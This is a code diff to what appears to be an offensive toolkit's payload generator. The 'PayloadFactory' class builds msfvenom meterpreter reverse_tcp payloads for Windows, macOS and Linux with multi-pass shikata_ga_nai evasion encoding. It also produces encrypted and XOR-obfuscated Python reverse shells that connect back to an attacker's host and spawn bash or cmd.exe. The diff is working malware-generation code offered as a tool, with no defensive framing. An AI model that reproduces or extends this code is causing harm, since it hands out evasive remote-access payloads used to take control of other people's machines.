@@ -7,30 +7,43 @@ import os
 import subprocess
 from shadowcypher.core.logger import logger
 from shadowcypher.core.runner import runner
+from shadowcypher.core.platform import platform_engine
 
 class PayloadFactory:
     """The 'Forge' for high-fidelity malicious artifacts."""
 
     @staticmethod
     def generate_evasive_elf(lhost, lport, iterations=10, on_output=None):
-        """Generate a hardened Linux ELF with multi-stage Shikata Ga Nai encoding."""
-        out_path = f"payloads/shell_x64_{lport}.elf"
+        """Generate a hardened payload with multi-stage Shikata Ga Nai encoding.
+        Auto-selects format based on host OS."""
+        # Cross-platform payload format selection
+        if platform_engine.IS_WINDOWS:
+            plat_args = ["-p", "windows/x64/meterpreter/reverse_tcp",
+                         "-a", "x64", "--platform", "windows", "-f", "exe"]
+            ext = "exe"
+        elif platform_engine.IS_MACOS:
+            plat_args = ["-p", "osx/x64/meterpreter/reverse_tcp",
+                         "-a", "x64", "--platform", "osx", "-f", "macho"]
+            ext = "macho"
+        else:
+            plat_args = ["-p", "linux/x64/meterpreter/reverse_tcp",
+                         "-a", "x64", "--platform", "linux", "-f", "elf"]
+            ext = "elf"
+
+        out_path = f"payloads/shell_x64_{lport}.{ext}"
         os.makedirs("payloads", exist_ok=True)
         
         args = [
             "msfvenom",
-            "-p", "linux/x64/meterpreter/reverse_tcp",
+        ] + plat_args + [
             f"LHOST={lhost}",
             f"LPORT={int(lport)}",
-            "-a", "x64",
-            "--platform", "linux",
             "-e", "x64/shikata_ga_nai",
             "-i", str(iterations),
-            "-f", "elf",
             "-o", out_path
         ]
         
-        logger.info("forge", f"FORGING_HARDENED_ELF: {out_path} ({iterations} iterations)")
+        logger.info("forge", f"FORGING_HARDENED_PAYLOAD: {out_path} ({iterations} iterations, {platform_engine.SYSTEM})")
         return runner.execute_task(f"PAYLOAD_FORGE_{lport}", args, callback=on_output)
 
     @staticmethod
@@ -63,13 +76,15 @@ class PayloadFactory:
         f = Fernet(key)
         
         raw_shell = f"""
-import socket,os,pty,threading,time
+import socket,os,threading,time
 def connect():
     try:
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect(('{lhost}',{lport}))
         os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
-        pty.spawn('/bin/bash')
+        import subprocess,platform
+        sh = '/bin/bash' if platform.system() != 'Windows' else 'cmd.exe'
+        subprocess.call([sh])
     except: pass
 
 while True:
@@ -92,7 +107,8 @@ exec(f.decrypt(e).decode())
     def generate_obfuscated_python(lhost, lport):
         """Generate a professional XOR-obfuscated python reverse shell."""
         import base64
-        raw_shell = f"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
+        _shell = platform_engine.get_cmd('shell')
+        raw_shell = f"import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['{_shell}'])"
         
         key = 0x42
         xor_shell = "".join([chr(ord(c) ^ key) for c in raw_shell])
